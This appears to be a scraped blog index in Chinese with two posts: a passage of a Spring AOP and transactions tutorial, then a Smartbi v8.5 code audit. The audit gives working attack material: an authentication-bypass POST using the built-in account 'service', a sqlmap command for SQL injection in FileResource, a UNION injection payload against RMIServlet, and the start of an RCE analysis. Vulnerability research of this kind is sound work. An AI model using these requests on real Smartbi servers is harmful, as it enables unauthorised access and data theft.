java.lang.reflect.Method; public class AfterLog implements AfterReturningAdvice { //returnValue;返回值 @Override public void afterReturning(Object returnValue, Method method, Object[] args, Object target) throws Throwable { System.out.println(\u0026#34;执行了\u0026#34;+method.getName()+\u0026#34;方法，返回结果为：\u0026#34;+returnValue ); } } \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;beans xmlns=\u0026#34;http://www.springframework.org/schema/beans\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xmlns:aop=\u0026#34;http://www.springframework.org/schema/aop\u0026#34; xsi:schemaLocation=\u0026#34;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop.xsd\u0026#34;\u0026gt; \u0026lt;!--注册 beans--\u0026gt; \u0026lt;bean id=\u0026#34;userService\u0026#34; class=\u0026#34;com.kuang.service.UserServiceImpl\u0026#34;/\u0026gt; \u0026lt;bean id=\u0026#34;log\u0026#34; class=\u0026#34;com.kuang.log.Log\u0026#34;/\u0026gt; \u0026lt;bean id=\u0026#34;afterLog\u0026#34; class=\u0026#34;com.kuang.log.AfterLog\u0026#34;/\u0026gt; \u0026lt;!--方式一：使用原生 Spring API 接口--\u0026gt; \u0026lt;!--配置 aop: 导入 aop 约束--\u0026gt; \u0026lt;aop:config\u0026gt; \u0026lt;!--切入点：expression:表达式 execution(要执行的位置***) --\u0026gt; \u0026lt;aop:pointcut id=\u0026#34;pointcut\u0026#34; expression=\u0026#34;execution(* com.kuang.service.UserServiceImpl.*(..))\u0026#34;/\u0026gt; \u0026lt;!--执行环绕增加--\u0026gt; \u0026lt;aop:advisor advice-ref=\u0026#34;log\u0026#34; pointcut-ref=\u0026#34;pointcut\u0026#34;/\u0026gt; \u0026lt;aop:advisor advice-ref=\u0026#34;afterLog\u0026#34; pointcut-ref=\u0026#34;pointcut\u0026#34;/\u0026gt; \u0026lt;/aop:config\u0026gt; \u0026lt;/beans\u0026gt; import com.kuang.service.UserService; import org.springframework.context.ApplicationContext; import org.springframework.context.support.ClassPathXmlApplicationContext; public class MyTest { public static void main(String[] args) { ApplicationContext context = new ClassPathXmlApplicationContext(\u0026#34;applicationContext.xml\u0026#34;); //动态代理的是接口 UserService userService = context.getBean(\u0026#34;userService\u0026#34;, UserService.class); userService.add(); } } 第二种方式：自定义类来实现Aop 目标业务类不变依旧是userServiceImpl\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 package com.kuang.diy; public class DiyPointCut { public void before(){ System.out.println(\u0026#34;========方法执行前========\u0026#34;); } public void after(){ System.out.println(\u0026#34;========方法执行后========\u0026#34;); } } \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;beans xmlns=\u0026#34;http://www.springframework.org/schema/beans\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xmlns:aop=\u0026#34;http://www.springframework.org/schema/aop\u0026#34; xsi:schemaLocation=\u0026#34;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop.xsd\u0026#34;\u0026gt; \u0026lt;!--注册 beans--\u0026gt; \u0026lt;bean id=\u0026#34;userService\u0026#34; class=\u0026#34;com.kuang.service.UserServiceImpl\u0026#34;/\u0026gt; \u0026lt;bean id=\u0026#34;log\u0026#34; class=\u0026#34;com.kuang.log.Log\u0026#34;/\u0026gt; \u0026lt;bean id=\u0026#34;afterLog\u0026#34; class=\u0026#34;com.kuang.log.AfterLog\u0026#34;/\u0026gt; \u0026lt;!-- \u0026amp;lt;!\u0026amp;ndash;方式一：使用原生 Spring API 接口\u0026amp;ndash;\u0026amp;gt;--\u0026gt; \u0026lt;!-- \u0026amp;lt;!\u0026amp;ndash;配置 aop: 导入 aop 约束\u0026amp;ndash;\u0026amp;gt;--\u0026gt; \u0026lt;!-- \u0026lt;aop:config\u0026gt;--\u0026gt; \u0026lt;!-- \u0026amp;lt;!\u0026amp;ndash;切入点：expression:表达式 execution(要执行的位置***) \u0026amp;ndash;\u0026amp;gt;--\u0026gt; \u0026lt;!-- \u0026lt;aop:pointcut id=\u0026#34;pointcut\u0026#34; expression=\u0026#34;execution(* com.kuang.service.UserServiceImpl.*(..))\u0026#34;/\u0026gt;--\u0026gt; \u0026lt;!-- \u0026amp;lt;!\u0026amp;ndash;执行环绕增加\u0026amp;ndash;\u0026amp;gt;--\u0026gt; \u0026lt;!-- \u0026lt;aop:advisor advice-ref=\u0026#34;log\u0026#34; pointcut-ref=\u0026#34;pointcut\u0026#34;/\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;aop:advisor advice-ref=\u0026#34;afterLog\u0026#34; pointcut-ref=\u0026#34;pointcut\u0026#34;/\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;/aop:config\u0026gt;--\u0026gt; \u0026lt;!--方式二：自定义类--\u0026gt; \u0026lt;bean id=\u0026#34;diy\u0026#34; class=\u0026#34;com.kuang.diy.DiyPointCut\u0026#34;/\u0026gt; \u0026lt;aop:config\u0026gt; \u0026lt;!--自定义切面，ref 要引用的类--\u0026gt; \u0026lt;aop:aspect ref=\u0026#34;diy\u0026#34;\u0026gt; \u0026lt;!--切入点--\u0026gt; \u0026lt;aop:pointcut id=\u0026#34;diyPonitcut\u0026#34; expression=\u0026#34;execution(* com.kuang.service.UserServiceImpl.*(..))\u0026#34;/\u0026gt; \u0026lt;!--通知--\u0026gt; \u0026lt;aop:before pointcut-ref=\u0026#34;diyPonitcut\u0026#34; method=\u0026#34;before\u0026#34;/\u0026gt; \u0026lt;aop:after pointcut-ref=\u0026#34;diyPonitcut\u0026#34; method=\u0026#34;after\u0026#34;/\u0026gt; \u0026lt;/aop:aspect\u0026gt; \u0026lt;/aop:config\u0026gt; \u0026lt;/beans\u0026gt; 第三种方式： 使用注解实现 java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 package com.kuang.diy; import org.aspectj.lang.ProceedingJoinPoint; import org.aspectj.lang.annotation.After; import org.aspectj.lang.annotation.Around; import org.aspectj.lang.annotation.Aspect; import org.aspectj.lang.annotation.Before; //标注这个类是一个切面 @Aspect public class AnnotationPointCut { @Before(\u0026#34;execution(* com.kuang.service.UserServiceImpl.*(..))\u0026#34;) public void before(){ System.out.println(\u0026#34;========方法执行前========\u0026#34;); } @After(\u0026#34;execution(* com.kuang.service.UserServiceImpl.*(..))\u0026#34;) public void after(){ System.out.println(\u0026#34;========方法执行后========\u0026#34;); } //在环绕增强中，我们可以给定一个参数，代表我们要获取处理切入的点 @Around(\u0026#34;execution(* com.kuang.service.UserServiceImpl.*(..))\u0026#34;) public void around(ProceedingJoinPoint jp) throws Throwable { System.out.println(\u0026#34;环绕前\u0026#34;); Object proceed = jp.proceed(); System.out.println(\u0026#34;环绕后\u0026#34;); } } \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;beans xmlns=\u0026#34;http://www.springframework.org/schema/beans\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xmlns:aop=\u0026#34;http://www.springframework.org/schema/aop\u0026#34; xsi:schemaLocation=\u0026#34;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop.xsd\u0026#34;\u0026gt; \u0026lt;!--方式三--\u0026gt; \u0026lt;bean id=\u0026#34;annotationPointcut\u0026#34; class=\u0026#34;com.kuang.diy.AnnotationPointCut\u0026#34;/\u0026gt; \u0026lt;!--开启注解支持--\u0026gt; \u0026lt;aop:aspectj-autoproxy/\u0026gt; \u0026lt;/beans\u0026gt; 5、整合 Mybatis（暂时跳过） 5.1.1 导入相关 jar 包 (版本可以根据最新版调整)\nxml\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 \u0026lt;dependencies\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;junit\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;junit\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;4.12\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.mybatis\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;mybatis\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.5.2\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;mysql\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;mysql-connector-java\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;5.1.47\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-webmvc\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;5.1.10.RELEASE\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-jdbc\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;5.1.10.RELEASE\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- https://mvnrepository.com/artifact/org.aspectj/aspectjweaver --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.aspectj\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;aspectjweaver\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.9.4\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.mybatis\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;mybatis-spring\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.0.2\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;/dependencies\u0026gt; 6、声明式事务 6.1 回顾事务 事务是逻辑上的一组操作，要么都执行，要么都不执行\n把一组业务当成一个业务来做，要么都成功，要么都失败。 事务在项目开发过程非常重要，涉及到数据的一致性的问题，不容马虎！ 事务管理是企业级应用程序开发中必备技术，用来确保数据的完整性和一致性。 事务 ACID 原则\n原子性（atomicity） 事务是原子性操作，由一系列动作组成，事务的原子性确保动作要么全部完成，要么完全不起作用 一致性（consistency） 一旦所有事务动作完成，事务就要被提交。数据和资源处于一种满足业务规则的一致性状态中 隔离性（isolation） 可能多个事务会同时处理相同的数据，因此每个事务都应该与其他事务隔离开来，防止数据损坏 持久性（durability） 事务一旦完成，无论系统发生什么错误，结果都不会受到影响。通常情况下，事务的结果被写到持久化存储器中 A、I、D 是手段，C 是目的！\n6.2 Spring中的事务管理 6.2.1 Spring 支持的俩种事务管理方式 编程式事务管理 在代码中手动控制事务的开启、提交和回滚，灵活但耦合业务代码和事务逻辑\n使用TransactionTemplate 进行编程式事务管理的示例代码如下：\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 @Autowired private TransactionTemplate transactionTemplate; public void testTransaction() { //调用 transactionTemplate.execute() 开始事务执行 transactionTemplate.execute(new TransactionCallbackWithoutResult() { @Override //传入回调 TransactionCallbackWithoutResult，回调中写业务逻辑，transactionStatus 对象表示当前事务的状态，可以用来设置回滚 protected void doInTransactionWithoutResult(TransactionStatus transactionStatus) { try { // .... 业务代码 } catch (Exception e){ //回滚 //如果出现异常，调用 transactionStatus.setRollbackOnly()，标记事务为回滚状态 transactionStatus.setRollbackOnly(); } } }); } 使用 TransactionManager 进行编程式事务管理的示例代码如下：\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 @Autowired //PlatformTransactionManager 可以手动开启、提交、回滚事务 private PlatformTransactionManager transactionManager; public void testTransaction() { //调用 getTransaction() 开启一个事务，返回事务状态对象 status。 //DefaultTransactionDefinition() 是事务配置，这里使用默认值：传播行为：PROPAGATION_REQUIRED；隔离级别：ISOLATION_DEFAULT TransactionStatus status = transactionManager.getTransaction(new DefaultTransactionDefinition()); try { // .... 业务代码 //执行成功-调用 transactionManager.commit(status) 提交事务 transactionManager.commit(status); } catch (Exception e) { //捕获异常-调用 transactionManager.rollback(status) 回滚事务 transactionManager.rollback(status); } } 声明式事务管理 使用@Transactional注解或 XML 配置， Spring AOP 自动管理事务\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 //声明式事务注解 //propagation = Propagation.REQUIRED：当前方法有事务则加入该事务；如果当前方法没有事务，则新建一个事务。 @Transactional(propagation = Propagation.REQUIRED) //业务方法 public void aMethod { //do something //创建两个对象 b 和 c B b = new B(); C c = new C(); //调用 B 和 C 的方法 b.bMethod(); c.cMethod(); } spring 7种事务传播行为**：**\npropagation_requierd：如果当前没有事务，就新建一个事务，如果已存在一个事务中，加入到这个事务中，这是最常见的选择。 propagation_supports：支持当前事务，如果没有当前事务，就以非事务方法执行。 propagation_mandatory：使用当前事务，如果没有当前事务，就抛出异常。 propagation_required_new：新建事务，如果当前存在事务，把当前事务挂起。 propagation_not_supported：以非事务方式执行操作，如果当前存在事务，就把当前事务挂起。 propagation_never：以非事务方式执行操作，如果当前事务存在则抛出异常。 propagation_nested：如果当前存在事务，则在嵌套事务内执行。如果当前没有事务，则执行与propagation_required类似的操作 Spring 默认的事务传播行为是 PROPAGATION_REQUIRED，它适合于绝大多数的情况。\n使用Spring管理事务，注意头文件的约束导入 : tx\nplain\r1 2 3 4 xmlns:tx=\u0026#34;http://www.springframework.org/schema/tx\u0026#34; http://www.springframework.org/schema/tx http://www.springframework.org/schema/tx/spring-tx.xsd\u0026#34;\u0026gt; ","permalink":"http://localhost:1313/xvsf/posts/spring/","summary":"\u003ch1 id=\"1spring简介\"\u003e1、Spring简介\u003c/h1\u003e\n\u003cp\u003e\u003ca href=\"https://spring.io/\"\u003eSpring 官网\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://docs.spring.io/spring-framework/docs/5.2.0.RELEASE/spring-framework-reference/core.html#spring-core\"\u003eSpring 5.2.0 官方文档\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/spring-projects/spring-framework\"\u003eGitHub - spring-projects/spring-framework: Spring Framework\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://mvnrepository.com/artifact/org.springframework/spring-webmvc\"\u003espring-webmvc\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"code-block-container\" data-expanded=\"true\"\u003e\r\n    \u003cdiv class=\"code-header\"\u003e\r\n        \u003cdiv class=\"mac-buttons\"\u003e\r\n            \u003cspan class=\"mac-button red\"\u003e\u003c/span\u003e\r\n            \u003cspan class=\"mac-button yellow\"\u003e\u003c/span\u003e\r\n            \u003cspan class=\"mac-button green\"\u003e\u003c/span\u003e\r\n        \u003c/div\u003e\r\n        \u003cspan class=\"code-language\"\u003exml\u003c/span\u003e\r\n        \u003cdiv class=\"code-actions\"\u003e\r\n            \u003cbutton class=\"copy-btn\" title=\"Copy\"\u003e\r\n                \u003csvg xmlns=\"http://www.w3.org/2000/svg\" width=\"16\" height=\"16\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\"\u003e\u003crect x=\"9\" y=\"9\" width=\"13\" height=\"13\" rx=\"2\" ry=\"2\"\u003e\u003c/rect\u003e\u003cpath d=\"M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1\"\u003e\u003c/path\u003e\u003c/svg\u003e\r\n            \u003c/button\u003e\r\n            \u003cbutton class=\"toggle-btn\" title=\"Toggle\"\u003e\r\n                \u003csvg xmlns=\"http://www.w3.org/2000/svg\" width=\"16\" height=\"16\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\" class=\"feather feather-chevron-down\"\u003e\u003cpolyline points=\"6 9 12 15 18 9\"\u003e\u003c/polyline\u003e\u003c/svg\u003e\r\n            \u003c/button\u003e\r\n        \u003c/div\u003e\r\n    \u003c/div\u003e\r\n    \u003cdiv class=\"code-content\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cdiv class=\"chroma\"\u003e\n\u003ctable class=\"lntable\"\u003e\u003ctr\u003e\u003ctd class=\"lntd\"\u003e\n\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode\u003e\u003cspan class=\"lnt\" id=\"1\"\u003e\u003ca class=\"lnlinks\" href=\"#1\"\u003e1\u003c/a\u003e\n\u003c/span\u003e\u003cspan class=\"lnt\" id=\"2\"\u003e\u003ca class=\"lnlinks\" href=\"#2\"\u003e2\u003c/a\u003e\n\u003c/span\u003e\u003cspan class=\"lnt\" id=\"3\"\u003e\u003ca class=\"lnlinks\" href=\"#3\"\u003e3\u003c/a\u003e\n\u003c/span\u003e\u003cspan class=\"lnt\" id=\"4\"\u003e\u003ca class=\"lnlinks\" href=\"#4\"\u003e4\u003c/a\u003e\n\u003c/span\u003e\u003cspan class=\"lnt\" id=\"5\"\u003e\u003ca class=\"lnlinks\" href=\"#5\"\u003e5\u003c/a\u003e\n\u003c/span\u003e\u003cspan class=\"lnt\" id=\"6\"\u003e\u003ca class=\"lnlinks\" href=\"#6\"\u003e6\u003c/a\u003e\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\n\u003ctd class=\"lntd\"\u003e\n\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-xml\" data-lang=\"xml\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c\"\u003e\u0026lt;!-- https://mvnrepository.com/artifact/org.springframework/spring-webmvc --\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e\u0026lt;dependency\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"nt\"\u003e\u0026lt;groupId\u0026gt;\u003c/span\u003eorg.springframework\u003cspan class=\"nt\"\u003e\u0026lt;/groupId\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"nt\"\u003e\u0026lt;artifactId\u0026gt;\u003c/span\u003espring-webmvc\u003cspan class=\"nt\"\u003e\u0026lt;/artifactId\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"nt\"\u003e\u0026lt;version\u0026gt;\u003c/span\u003e5.2.0.RELEASE\u003cspan class=\"nt\"\u003e\u0026lt;/version\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e\u0026lt;/dependency\u0026gt;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/table\u003e\n\u003c/div\u003e\n\u003c/div\u003e\u003c/div\u003e\r\n\u003c/div\u003e\u003ch2 id=\"11优点\"\u003e1.1、优点\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003eSpring是一个开源的免费的框架\u003c/li\u003e\n\u003cli\u003eSpring是一个轻量级的、非入侵式的框架\u003c/li\u003e\n\u003cli\u003e控制反转（IOC），面向切面编程（AOP）\u003c/li\u003e\n\u003cli\u003e支持事物的处理，对框架整合的支持\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e总结一句话：Spring就是一个轻量级的控制反转（IOC）和面向切面编程（AOP）的框架\u003c/p\u003e","title":"Spring"},{"content":"Smartbi v8.5 代码审计 目录结构 text\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 E:. ├─Infobright\t用于分析型数据存储 ├─jdk\tJava 开发环境 ├─MySQL\t数据库服务 ├─SmartbiUnionServer\tSmartbi 的 Union Server 模块（Presto 引擎相关） ├─smartbixmla\tSmartbi XMLA 接口模块，主要用于与外部如 Excel 的数据透视表通信 └─Tomcat\tSmartbi 使用的 Web 应用服务器，部署了核心 web 模块和插件扩展 ├─bin\t包含Tomcat的启动/关闭脚本、Smartbi 的配置文件、运行日志 | | exts-smartbi\t扩展模块 |\t| Index-smartbi\t搜索索引 |\t| mlogs-smartbi\t模块级别日志 |\t| SmartbiX-ExtractData\t数据导出模块 | | smartbi_repoBackup\t仓库备份 |\t├─conf\t配置文件所在 |\t│ catalina.policy |\t│ catalina.properties |\t│ context.xml |\t│ logging.properties |\t│ server.xml |\t│ tomcat-users.xml |\t│ web.xml |\t│ |\t└─Catalina |\t└─localhost ├─lib\t包含Tomcat运行所需的JAR库文件 ├─logs ├─temp ├─webapps\t实际部署的Web应用程序 ├─work\tTomcat 运行时自动生成的 JSP 编译缓存 在找源码的过程中，看到该系统使用了 Servlet 框架，理解 Servlet 框架对后续的代码理解有帮助\nservlet\nhttps://86263008.github.io/web2024/back/java/jsp/servlet/index.html\nhttps://kirklin.github.io/PrivateNotes/Java%E5%85%A8%E5%A5%97/JavaWeb/Servlet/#_11\nhttps://blog.csdn.net/yxmoar/article/details/109889006\n历史漏洞： 未授权访问 Smartbi 身份认证绕过漏洞\nhttps://www.freebuf.com/vuls/373015.html\n网上的 身份认证/内置用户登陆 绕过的代码和v8.5版本的有一些区别，不过还是能跟踪到代码漏洞点\n1、代码分析\nE:\\Smartbi\\Tomcat\\webapps\\smartbi\\WEB-INF\\lib\\smartbi-FreeQuery.jar!\\smartbi\\freequery\\filter\\CheckIsLoggedFilter.class\n首先找到 CheckIsLoggedFilter.class 文件的 needToCheck() 方法，\nJava\r1 2 3 4 5 6 7 private boolean needToCheck(String className, String methodName) { //判断 className 非空且不是 BIConfigService （ BIConfigService 是完全信任的服务类，不需要任何登录校验） if (!StringUtil.isNullOrEmpty(className) \u0026amp;\u0026amp; !className.equals(\u0026#34;BIConfigService\u0026#34;)) { //如果调用的是 UserService 中的方法，即 methodName 属于{\u0026#34;login\u0026#34;, \u0026#34;loginFor\u0026#34;, \u0026#34;clickLogin\u0026#34;, \u0026#34;loginFromDB\u0026#34;, \u0026#34;logout\u0026#34;, \u0026#34;isLogged\u0026#34;, \u0026#34;isLoginAs\u0026#34;, \u0026#34;checkVersion\u0026#34;, \u0026#34;hasLicense\u0026#34;} if (className.equals(\u0026#34;UserService\u0026#34;) \u0026amp;\u0026amp; StringUtil.isInArray(methodName, new String[]{\u0026#34;login\u0026#34;, \u0026#34;loginFor\u0026#34;, \u0026#34;clickLogin\u0026#34;, \u0026#34;loginFromDB\u0026#34;, \u0026#34;logout\u0026#34;, \u0026#34;isLogged\u0026#34;, \u0026#34;isLoginAs\u0026#34;, \u0026#34;checkVersion\u0026#34;, \u0026#34;hasLicense\u0026#34;})) { //则不需要登录验证 return false; 接下来找找 CheckIsLoggedFilter 是在哪里利用的？\n找到在web.xml中有我们需要的路由 /vision/RMIServlet\n看到的文章中都是先知道了 RMIServlet 这个路由，然后找到 CheckIsLoggedFilter\n尝试访问 http://localhost:18080/smartbi/vision/RMIServlet\nPOC：\n主要结构：\ntext\r1 2 3 4 5 6 7 8 9 10 POST /smartbi/vision/RMIServlet HTTP/1.1 Host: localhost:18080 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36 Accept: */* Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Content-Type: application/x-www-form-urlencoded Connection: close className=UserService\u0026amp;methodName=loginFromDB\u0026amp;params=[\u0026#34;service\u0026#34;,\u0026#34;0a\u0026#34;] 内置用户（service），口令为0a；public、system可能不存在。\n使用hackbar也可以，\n之后访问 http://localhost:18080/smartbi/vision/\n发现已经进入后台\nSQL注入（FileResource） FileResource 是用于处理文件的 Servlet\nE:\\Smartbi\\Tomcat\\webapps\\smartbi\\WEB-INF\\lib\\smartbi-FreeQuery.jar!\\smartbi\\freequery\\fileresource\\FileResourceServlet.class\n分析代码：\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 } else { //从请求中获取 resID resID = request.getParameter(\u0026#34;resId\u0026#34;); //初始化 headerType 为 inline，inline 表示浏览器尝试直接在页面中打开文件（比如 PDF、图片） String headerType = \u0026#34;inline\u0026#34;; //判断操作类型 opType 是 \u0026#34;OPEN\u0026#34; 还是 \u0026#34;DOWNLOAD\u0026#34; if (\u0026#34;OPEN\u0026#34;.equals(opType)) { actionType = OperationType.FILE_RESOURCE_OPEN; } else { actionType = OperationType.FILE_RESOURCE_DOWNLOAD; headerType = \u0026#34;attachment\u0026#34;; } //使用 Connection 对象创建 Statement，用于执行 SQL Statement stat = conn.createStatement(); //执行 SQL 查询，从 t_fileresource 表中查找指定 resID 的资源文件信息 ResultSet rs = stat.executeQuery(\u0026#34;select c_content,c_name,c_alias,c_type from t_fileresource where c_id = \u0026#39;\u0026#34; + resID + \u0026#34;\u0026#39;\u0026#34;); 没有对 resID 参数进行过滤直接使用 executeQuery() 拼接执行sql语句，造成sql注入\n构造payload：\ntext\r1 http://127.0.0.1:18080/smartbi/vision/FileResource?resId=1\u0026amp;opType=DOWNLOAD 可以sqlmap跑一下：\ntext\r1 python sqlmap.py -u \u0026#34;http://127.0.0.1:18080/smartbi/vision/FileResource?resId=1\u0026amp;opType=DOWNLOAD\u0026#34; SQL注入（RMIServlet） E:\\Smartbi\\Tomcat\\webapps\\smartbi\\WEB-INF\\lib\\smartbi-FreeQuery.jar!\\smartbi\\freequery\\repository\\FileResourceDAO.class\ngetFileResource方法接收参数 id ，直接拼接SQl语句查询 t_fileresource 表，没有对 id 进行过滤或者其他的安全措施，存在SQL注入风险\ngetFileResource方法在URLLinkService中调用：\nE:\\Smartbi\\Tomcat\\webapps\\smartbi\\WEB-INF\\lib\\smartbi-FreeQuery.jar!\\smartbi\\freequery\\client\\urllink\\URLLinkService.class\n漏洞复现：\ntext\r1 2 3 4 5 POST /smartbi/vision/RMIServlet HTTP/1.1 Content-Type: application/x-www-form-urlencoded className=UrlLinkService\u0026amp;methodName=getFileResource\u0026amp;params=[\u0026#34;1\u0026#39;union select database(),2,3,4,5,6#\u0026#34;] text\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 POST /smartbi/vision/RMIServlet HTTP/1.1 Host: localhost:18080 sec-ch-ua: \u0026#34;Chromium\u0026#34;;v=\u0026#34;113\u0026#34;, \u0026#34;Not-A.Brand\u0026#34;;v=\u0026#34;24\u0026#34; sec-ch-ua-mobile: ?0 sec-ch-ua-platform: \u0026#34;Windows\u0026#34; Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Sec-Fetch-Site: none Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 Sec-Fetch-Dest: document Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Content-Type: application/x-www-form-urlencoded Cookie: JSESSIONID=7DDE39A449342C004D2F35ABF13BB5AB Connection: close Content-Length: 99 className=UrlLinkService\u0026amp;methodName=getFileResource\u0026amp;params=[\u0026#34;1\u0026#39;union select database(),2,3,4,5,6#\u0026#34;] 后台rce E:\\Smartbi\\Tomcat\\webapps\\smartbi\\WEB-INF\\lib\\smartbi-FreeQuery.jar!\\smartbi\\freequery\\sync\\SyncServlet.class\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 if (!ServletFileUpload.isMultipartContent(request)) { request.setCharacterEncoding(\u0026#34;UTF-8\u0026#34;); String type = request.getParameter(\u0026#34;type\u0026#34;); response.setBufferSize(4096); //type=sqldictsync 时执行 if (type.equals(\u0026#34;sqldictsync\u0026#34;)) { //记录时间 long startTime = System.currentTimeMillis(); //数据库连接参数 String dbType = request.getParameter(\u0026#34;dbType\u0026#34;); String dbServer = request.getParameter(\u0026#34;dbServer\u0026#34;); String dbName = request.getParameter(\u0026#34;dbName\u0026#34;); String dbUser = request.getParameter(\u0026#34;dbUser\u0026#34;); String dbPass = request.getParameter(\u0026#34;dbPass\u0026#34;); String querySql = request.getParameter(\u0026#34;querySql\u0026#34;); 